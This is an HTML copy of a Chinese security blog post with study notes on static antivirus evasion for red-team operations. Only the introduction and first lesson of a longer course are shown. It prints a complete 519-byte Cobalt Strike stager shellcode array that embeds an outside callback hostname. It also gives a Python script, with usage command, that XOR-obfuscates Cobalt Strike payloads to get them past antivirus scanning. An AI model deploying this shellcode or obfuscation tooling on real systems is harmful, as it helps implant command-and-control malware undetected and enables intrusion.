<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="免杀学习：静态恶意代码逃逸"><meta name="keywords" content="红蓝对抗"><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><title>免杀学习：静态恶意代码逃逸 | m0nk3y's Blog @ D0g3</title><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.1.1'
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="m0nk3y's Blog @ D0g3" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%AF%BE%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">参考课程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E4%BB%A3%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">关于代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98"><span class="toc-number">2.2.</span> <span class="toc-text">关于内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80"><span class="toc-number">2.3.</span> <span class="toc-text">关于静态免杀</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%EF%BC%88%E7%AC%AC%E4%B8%80%E8%AF%BE%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">静态恶意代码逃逸（第一课）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">3.1.</span> <span class="toc-text">恶意代码的定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E5%AE%9A%E4%B9%89"><span class="toc-number">3.2.</span> <span class="toc-text">Shellcode定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RAW-%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.</span> <span class="toc-text">RAW 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E6%96%87%E4%BB%B6"><span class="toc-number">3.4.</span> <span class="toc-text">C 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E5%90%88"><span class="toc-number">3.5.</span> <span class="toc-text">组合</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%EF%BC%88%E7%AC%AC%E4%BA%8C%E8%AF%BE%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">静态恶意代码逃逸（第二课）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EWindows%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AD%98"><span class="toc-number">4.1.</span> <span class="toc-text">关于Windows操作系统内存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98API%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">4.2.</span> <span class="toc-text">申请内存API的关系</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%AD%A3%E5%B8%B8%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.3.</span> <span class="toc-text">实现一次正常加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%B8%80%E6%AC%A1%E6%B7%B7%E6%B7%86%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.4.</span> <span class="toc-text">实现一次混淆加载</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E8%AF%BE"><span class="toc-number">5.</span> <span class="toc-text">第三课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E7%9A%84%E4%BC%98%E5%8C%96"><span class="toc-number">5.1.</span> <span class="toc-text">内存申请的优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">5.2.</span> <span class="toc-text">异或</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E8%AF%BE"><span class="toc-number">6.</span> <span class="toc-text">第四课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="toc-number">6.1.</span> <span class="toc-text">分离免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-number">6.2.</span> <span class="toc-text">管道</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E8%AF%BE"><span class="toc-number">7.</span> <span class="toc-text">第五课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9C%9F%E6%AD%A3%E6%84%8F%E4%B9%89%E7%9A%84%E5%88%86%E7%A6%BB"><span class="toc-number">7.1.</span> <span class="toc-text">真正意义的分离</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%A5%97%E6%8E%A5%E5%AD%97%EF%BC%88socket%EF%BC%89"><span class="toc-number">7.2.</span> <span class="toc-text">网络套接字（socket）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E8%AF%BE"><span class="toc-number">8.</span> <span class="toc-text">第六课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MemoryMoudle"><span class="toc-number">8.1.</span> <span class="toc-text">MemoryMoudle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84DLL%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%AE%9E%E9%AA%8C"><span class="toc-number">8.2.</span> <span class="toc-text">反射DLL加载的实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84DLL-%E4%B8%8E-MSF-%E8%81%94%E5%8A%A8"><span class="toc-number">8.3.</span> <span class="toc-text">反射DLL 与 MSF 联动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC7%E8%AF%BE"><span class="toc-number">9.</span> <span class="toc-text">第7课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BC%E5%85%A5%E5%9C%B0%E5%9D%80%E8%A1%A8%EF%BC%88IAT%EF%BC%89"><span class="toc-number">9.1.</span> <span class="toc-text">导入地址表（IAT）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetProcAddress-%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">9.2.</span> <span class="toc-text">GetProcAddress 获取函数地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%B7%B1%E5%86%99%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">9.3.</span> <span class="toc-text">自己写代码获取函数地址</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E8%AF%BE"><span class="toc-number">10.</span> <span class="toc-text">第八课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">10.1.</span> <span class="toc-text">字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-%E9%87%8D%E8%BD%BD%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">10.2.</span> <span class="toc-text">C++ 重载运算符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E8%AF%BE"><span class="toc-number">11.</span> <span class="toc-text">第九课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4%EF%BC%88DEP%EF%BC%89"><span class="toc-number">11.1.</span> <span class="toc-text">数据执行保护（DEP）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87DEP"><span class="toc-number">11.2.</span> <span class="toc-text">如何绕过DEP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BE%E4%B8%80%E5%8F%8D%E4%B8%89"><span class="toc-number">11.3.</span> <span class="toc-text">举一反三</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode-%E6%89%A7%E8%A1%8C"><span class="toc-number">11.4.</span> <span class="toc-text">Shellcode 执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E8%AF%BE"><span class="toc-number">12.</span> <span class="toc-text">第十课</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UUID"><span class="toc-number">12.1.</span> <span class="toc-text">UUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8Euuid-%E7%9B%B8%E5%85%B3%E7%9A%84Windows-API"><span class="toc-number">12.2.</span> <span class="toc-text">与uuid 相关的Windows API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uuid-%E6%B5%8B%E8%AF%95"><span class="toc-number">12.3.</span> <span class="toc-text">uuid 测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-CALL-BACK-%E5%87%BD%E6%95%B0"><span class="toc-number">12.4.</span> <span class="toc-text">Windows CALL BACK 函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">13.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210525201131.jpeg"></div><div class="author-info__name text-center">m0nk3y</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">15</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">1</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://www.google.com">Google</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">m0nk3y's Blog @ D0g3</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a><a class="site-page" href="/link">Friends</a><a class="site-page" href="/mytalk">Talk</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">免杀学习：静态恶意代码逃逸</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-02-20</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">14.6k</span><span class="post-meta__separator">|</span><span>Reading time: 75 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>了解了解</p>
<a id="more"></a>



<p>[toc]</p>
<h1 id="参考课程"><a href="#参考课程" class="headerlink" title="参考课程"></a>参考课程</h1><p>参考课程以及资料如下：</p>
<p>作者： 倾旋</p>
<p><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-09-24/1">后渗透下遇到的问题一（静态免杀）</a></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/1">静态恶意代码逃逸（第一课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/2">静态恶意代码逃逸（第二课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/3">静态恶意代码逃逸（第三课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/4">静态恶意代码逃逸（第四课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2019-11-10/5">静态恶意代码逃逸（第五课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-01-02/1">静态恶意代码逃逸（第六课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
<li><a target="_blank" rel="noopener" href="https://payloads.online/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
<li>第十课 <a target="_blank" rel="noopener" href="https://payloads.online/archivers/2021-02-08/1">https://payloads.online/archivers/2021-02-08/1</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
<p><strong>为了学习的完整性，推荐各位师傅去看原文学习，本文只是我的个人摘抄笔记，仅用做个人学习用途。</strong></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>通常在演练过程里，目的是追求快速的获取更多的权限，但是目标机器都安装了各种反病毒软件，种类繁多，大多对于静态查杀管控较为严格，导致一些工具无法使用。而在这个夹缝中生存的渗透师，就必须要学习更多的知识</p>
</blockquote>
<h2 id="关于代码"><a href="#关于代码" class="headerlink" title="关于代码"></a>关于代码</h2><p>一般来说，不管是Linux操作系统、Windows操作系统，可执行的应用程序文件，都遵循着一种格式：</p>
<ul>
<li>Linux ELF</li>
<li>Windows PE</li>
</ul>
<p>这种格式又包含了：可执行的应用程序、动态链接库等等，如Windows下的*.exe、*.dll。</p>
<p>而这些文件，其中都有一块空间用于保存程序的代码，也就是指令集，操作系统若想要执行一个文件，就要先将文件加载到内存，并分配相应的虚拟地址空间，创建一个进程和线程，线程再去执行程序的代码。</p>
<p>那么假设如上可以理解，就能够推断出常用的Shellcode加载器的工作原理：</p>
<ul>
<li>Shellcode是代码本身</li>
<li>加载器是具备读取代码的程序</li>
<li>加载器执行后，操作系统会创建一个进程与一个线程</li>
<li>第一个线程用于读取代码（Shellcode）并创建第二个线程，将线程执行的第一条指令指向代码（Shellcode）</li>
</ul>
<h2 id="关于内存"><a href="#关于内存" class="headerlink" title="关于内存"></a>关于内存</h2><p>在Windows操作系统中，每个进程互不干扰（除了公用的内核对象以外），都有自己的虚拟内存空间，而这一块线性的内存空间又被切成一页一页的大小，通常默认情况下，每页的大小是4KB。</p>
<p>Windows通过以页的单位来管理进程的虚拟内存空间，最典型的例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">  SIZE_T dwSize,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD  flProtect</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>使用<code>VirtualAlloc</code> Windows API 可向操作系统申请内存空间，操作系统根据指定的大小来调整分配几页，并且会自动进行内存对齐。</p>
<blockquote>
<p>为什么要讲到内存呢，因为<strong>静态免杀的核心就是将代码加载至内存</strong>，理解内存的管理方式，才能产生更多的想法。</p>
</blockquote>
<h2 id="关于静态免杀"><a href="#关于静态免杀" class="headerlink" title="关于静态免杀"></a>关于静态免杀</h2><p>静态免杀，提起这个很多人会想到很久远的…. <strong>花指令、压缩壳、垃圾资源</strong> 等等。</p>
<p>但是由于Shellcode加载器的出现，很多人开始从源码方面出发，通过正常且无害的API来构建一个加载器。</p>
<p>目前见的最多的是两大加载器：</p>
<ul>
<li>Shellcode加载器</li>
<li>PE加载器</li>
</ul>
<p>两者有什么不同呢，我想可能就是加载的文件格式不同，但最终都要运行文件中的代码。</p>
<h1 id="静态恶意代码逃逸（第一课）"><a href="#静态恶意代码逃逸（第一课）" class="headerlink" title="静态恶意代码逃逸（第一课）"></a>静态恶意代码逃逸（第一课）</h1><h2 id="恶意代码的定义"><a href="#恶意代码的定义" class="headerlink" title="恶意代码的定义"></a>恶意代码的定义</h2><p>以下文章中的所有关于恶意代码的定义都以Cobaltstrike的载荷为例。</p>
<h2 id="Shellcode定义"><a href="#Shellcode定义" class="headerlink" title="Shellcode定义"></a>Shellcode定义</h2><p>Shellcode是一段机器指令的集合，通常会被压缩至很小的长度，达到为后续恶意代码铺垫的作用。当然你可以通过msfvenom生成各种用于测试的shellcode。</p>
<h2 id="RAW-文件"><a href="#RAW-文件" class="headerlink" title="RAW 文件"></a>RAW 文件</h2><p>RAW 中文意思是原始的、未经加工的，通常使用Cobaltstrike生成的bin文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220130121.png"></p>
<p><strong>RAW文件是可以直接进行字节操作读取的，因此加载到内存较为方便</strong>，通常一般使用混淆的方式再生成一遍。</p>
<h2 id="C-文件"><a href="#C-文件" class="headerlink" title="C 文件"></a>C 文件</h2><p>C文件给出的是一个C语言中的字符数组，也是可以通过以字节单位操作的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* length: 519 bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h2><blockquote>
<p>采用混淆、加密解密的方式把载荷还原。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> argparse <span class="keyword">import</span> ArgumentParser, FileType</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_bin</span>(<span class="params">num, src_fp, dst_fp, dst_raw</span>):</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    shellcode_size = <span class="number">0</span></span><br><span class="line">    shellcode_raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            code = src_fp.read(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> code:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            base10 = ord(code) ^ num</span><br><span class="line">            base10_str = chr(base10)</span><br><span class="line">            shellcode_raw += base10_str.encode()</span><br><span class="line">            code_hex = hex(base10)</span><br><span class="line">            code_hex = code_hex.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span>(len(code_hex) == <span class="number">1</span>):</span><br><span class="line">                code_hex = <span class="string">&#x27;0&#x27;</span> + code_hex</span><br><span class="line">            shellcode += <span class="string">r&#x27;\x&#x27;</span> + code_hex</span><br><span class="line">            shellcode_size += <span class="number">1</span></span><br><span class="line">        src_fp.close()</span><br><span class="line">        dst_raw.write(shellcode_raw)</span><br><span class="line">        dst_raw.close()</span><br><span class="line">        dst_fp.write(shellcode)</span><br><span class="line">        dst_fp.close()</span><br><span class="line">        <span class="keyword">return</span> shellcode_size</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sys.stderr.writelines(str(e))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = ArgumentParser(prog=<span class="string">&#x27;Shellcode X&#x27;</span>, description=<span class="string">&#x27;[XOR The Cobaltstrike PAYLOAD.BINs] \t &gt; Author: rvn0xsy@gmail.com&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>,<span class="string">&#x27;--version&#x27;</span>,nargs=<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--src&#x27;</span>,help=<span class="string">u&#x27;source bin file&#x27;</span>,type=FileType(<span class="string">&#x27;rb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>,<span class="string">&#x27;--dst&#x27;</span>,help=<span class="string">u&#x27;destination shellcode file&#x27;</span>,type=FileType(<span class="string">&#x27;w+&#x27;</span>),required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--num&#x27;</span>,help=<span class="string">u&#x27;Confused number&#x27;</span>,type=int, default=<span class="number">90</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-r&#x27;</span>,<span class="string">&#x27;--raw&#x27;</span>,help=<span class="string">u&#x27;output bin file&#x27;</span>, type=FileType(<span class="string">&#x27;wb&#x27;</span>), required=<span class="literal">True</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    shellcode_size = process_bin(args.num, args.src, args.dst, args.raw)</span><br><span class="line">    sys.stdout.writelines(<span class="string">&quot;[+]Shellcode Size : &#123;&#125; \n&quot;</span>.format(shellcode_size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<p>把raw文件混淆，生成c语言数组</p>
<p>反感：</p>
<p>先生成bin文件，然后运行python脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\xor_shellcoder.py -s .\payload.bin  -d payload.c -n 10 -r RAW</span><br></pre></td></tr></table></figure>



<p>在payload.c中会看到raw文件里的每一个字节与10的异或运算出的C语言数组。</p>
